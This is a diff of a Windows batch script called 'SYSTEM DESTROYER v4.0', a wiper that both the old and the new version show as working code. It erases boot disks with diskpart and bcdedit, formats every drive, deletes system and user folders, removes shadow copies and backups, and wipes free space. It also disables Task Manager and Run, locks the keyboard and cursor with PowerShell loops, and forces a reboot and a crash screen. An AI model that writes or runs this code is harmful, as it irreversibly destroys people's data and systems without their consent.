@@ -7,63 +7,38 @@ if '%errorlevel%' NEQ '0' (
     exit /b
 )
 
+mode con: cols=80 lines=30
+title SYSTEM DESTROYER v4.0 - FINAL MISSION
+
+echo.
 echo ========================================
 echo    SYSTEM DESTROYER v4.0 - FINAL
 echo ========================================
+echo    PHASE 1: MBR/GPT DESTRUCTION
+echo ========================================
 echo.
 
-REM === БЛОКИРОВКА КЛАВИШ И МЫШИ ===
-echo [0] Блокировка интерфейса...
-reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f >nul 2>&1
-powershell -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class User32{[DllImport(\"user32.dll\")]public static extern bool BlockInput(bool fBlockIt);}';[User32]::BlockInput($true)"
+echo [1] Destroying boot sectors...
+(
+echo select disk 0
+echo clean
+echo exit
+) > %temp%\kill.dps
+diskpart /s %temp%\kill.dps >nul 2>&1
+bcdedit /delete {default} /f >nul 2>&1
+bcdedit /delete {bootmgr} /f >nul 2>&1
+del /f /q C:\bootmgr C:\boot\bcd >nul 2>&1
 
-REM === СКАЧИВАНИЕ И УСТАНОВКА ОБОЕВ ===
-echo [1] Установка обоев...
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://avatars.mds.yandex.net/i?id=27fde2643b29de9539d53dcb39448767_l-10814230-images-thumbs&n=13', '%TEMP%\wallpaper.jpg')"
-reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP%\wallpaper.jpg" /f >nul 2>&1
-reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "2" /f >nul 2>&1
-RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
-
-REM === СПАМ TXT ФАЙЛАМИ НА РАБОЧЕМ СТОЛЕ ===
-echo [2] Создание файлов...
-set "desktop=%USERPROFILE%\Desktop"
-for /l %%i in (1,1,500) do (
-    echo im fuck your pc > "%desktop%\FUCKED_%%i.txt"
-)
-
-REM === БЛОКИРОВКА ДИСПЕТЧЕРА ЗАДАЧ И ДРУГИХ СИСТЕМНЫХ ФУНКЦИЙ ===
-echo [3] Блокировка системных функций...
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
-
-REM === БЛОКИРОВКА ПЕРЕЗАГРУЗКИ ИЗ ИНТЕРФЕЙСА ===
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f >nul 2>&1
-
-REM === УНИЧТОЖЕНИЕ MBR И GPT ===
-echo [4] Уничтожение загрузчика...
-for %%d in (0 1 2 3) do (
-    echo select disk %%d > %temp%\clean.dps
-    echo clean >> %temp%\clean.dps
-    echo exit >> %temp%\clean.dps
-    diskpart /s %temp%\clean.dps >nul 2>&1
-)
-
-REM === ФОРМАТИРОВАНИЕ ДИСКОВ ===
-echo [5] Форматирование всех дисков...
+echo [2] Formatting ALL drives...
 for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist %%d:\ (
         echo y|format %%d: /FS:NTFS /Q /X /V:DEAD >nul 2>&1
+        echo y|format %%d: /FS:FAT32 /Q /X /V:DEAD >nul 2>&1
     )
 )
 
-REM === УДАЛЕНИЕ СИСТЕМНЫХ ПАПОК ===
-echo [6] Уничтожение системных папок...
-for %%f in ("C:\Windows" "C:\Program Files" "C:\Program Files (x86)" "C:\Users" "C:\ProgramData") do (
+echo [3] Killing system folders...
+for %%f in ("C:\Windows" "C:\Program Files" "C:\Program Files (x86)" "C:\Users" "C:\ProgramData" "C:\Recovery") do (
     if exist %%f (
         takeown /f %%f /r /d y >nul 2>&1
         icacls %%f /grant everyone:F /t /c /q >nul 2>&1
@@ -71,54 +46,73 @@ for %%f in ("C:\Windows" "C:\Program Files" "C:\Program Files (x86)" "C:\Users" 
     )
 )
 
-REM === СПАМ В КОНСОЛИ ===
-:spam
-echo im fuck your pc, windows user
-echo im fuck your pc, windows user
-echo im fuck your pc, windows user
-echo im fuck your pc, windows user
-echo im fuck your pc, windows user
-echo im fuck your pc, windows user
-echo im fuck your pc, windows user
-echo im fuck your pc, windows user
-echo im fuck your pc, windows user
-echo im fuck your pc, windows user
-goto spam
+echo [4] Destroying recovery...
+vssadmin delete shadows /all /quiet >nul 2>&1
+wbadmin delete catalog -quiet >nul 2>&1
+rd /s /q "C:\System Volume Information" >nul 2>&1
+rd /s /q "C:\$Recycle.Bin" >nul 2>&1
 
-REM === ДОПОЛНИТЕЛЬНЫЕ ФАЙЛЫ ===
-echo [7] Создание дополнительных файлов...
-for /l %%i in (1,1,100) do (
-    echo SYSTEM DESTROYED >> "%desktop%\DESTROYED_%%i.txt"
+echo [5] Wiping free space...
+for %%d in (C D E F) do (
+    if exist %%d:\ (
+        echo   Wiping %%d:...
+        cipher /w:%%d:\ >nul 2>&1
+        echo   [DONE] Drive %%d: wiped
+    )
 )
 
-REM === БЛОКИРОВКА ПРОЦЕССОВ ===
-echo [8] Блокировка процессов...
-taskkill /f /im taskmgr.exe >nul 2>&1
-taskkill /f /im explorer.exe >nul 2>&1
-taskkill /f /im regedit.exe >nul 2>&1
-taskkill /f /im cmd.exe /fi "PID ne %PID%" >nul 2>&1
-
-REM === ЗАТИРАНИЕ СВОБОДНОГО ПРОСТРАНСТВА ===
-echo [9] Затирание дисков...
-for %%d in (C D E F) do if exist %%d:\ cipher /w:%%d:\ >nul 2>&1
-
-REM === ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА ===
 echo.
 echo ========================================
-echo    СИСТЕМА УНИЧТОЖЕНА
-echo    Перезагрузка через 10 секунд...
+echo    STARTING INTERFACE DESTRUCTION
 echo ========================================
+echo.
 
-REM === СОЗДАНИЕ ПРОЦЕССОВ-БЛОКИРОВЩИКОВ ===
-for /l %%i in (1,1,20) do (
-    start /min "" cmd /c "echo DO NOT CLOSE && timeout /t 9999"
+echo [6] Killing explorer and blocking...
+taskkill /f /im explorer.exe >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f >nul 2>&1
+
+echo [7] Loading ERROR SYSTEM...
+start /min powershell -WindowStyle Hidden -Command "while(1){Add-Type -AssemblyName System.Windows.Forms;$x=[System.Windows.Forms.Cursor]::Position.X;$y=[System.Windows.Forms.Cursor]::Position.Y;[System.Windows.Forms.MessageBox]::Show('FUCKED','ERROR',0,16);[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($x+50),($y+50))}"
+
+echo [8] Keyboard blocking...
+powershell -Command "$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.SendKeys]::SendWait('{F13}'); while(1){[System.Windows.Forms.SendKeys]::SendWait('{SCROLLLOCK}')}"
+
+echo.
+echo ========================================
+echo    COUNTDOWN TO PC DEATH
+echo ========================================
+echo.
+
+for /l %%i in (10,-1,1) do (
+    echo ERROR [%%i]: SYSTEM FATAL ERROR - REBOOT IN %%i
+    timeout /t 1 /nobreak >nul
+    mode con: cols=!random:~-2,2! lines=!random:~-2,1!
+    color !random:~-1,1!!random:~-1,1!
 )
 
-timeout /t 10 /nobreak >nul
+echo.
+echo ========================================
+echo    FINAL DESTRUCTION COMPLETE
+echo    REBOOTING TO NOTHINGNESS...
+echo ========================================
+echo.
 
-shutdown /r /f /t 0
+for /l %%i in (5,-1,0) do (
+    echo SYSTEM WILL REBOOT IN %%i SECONDS
+    echo ERROR: MEMORY_CORRUPTION_%%i
+    timeout /t 1 /nobreak >nul
+)
+
+echo ERROR: CRITICAL_SYSTEM_FAILURE
+echo ERROR: BOOT_DEVICE_NOT_FOUND
+echo ERROR: NO_OPERATING_SYSTEM
+echo.
+
+start /min shutdown /r /f /t 0
 wmic os where primary=1 call reboot >nul 2>&1
-
-REM === ЕСЛИ ПЕРЕЗАГРУЗКА НЕ СРАБОТАЛА - СИНИЙ ЭКРАН ===
+powershell -Command "Restart-Computer -Force"
 rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0 >nul 2>&1
-rundll32.exe ntdll.dll,NtRaiseHardError 0xc000021a 0 0 0 6 >nul 2>&1
+rundll32.exe ntdll.dll,NtRaiseHardError 0xC000021A 0 0 0 6 >nul 2>&1
+
+exit
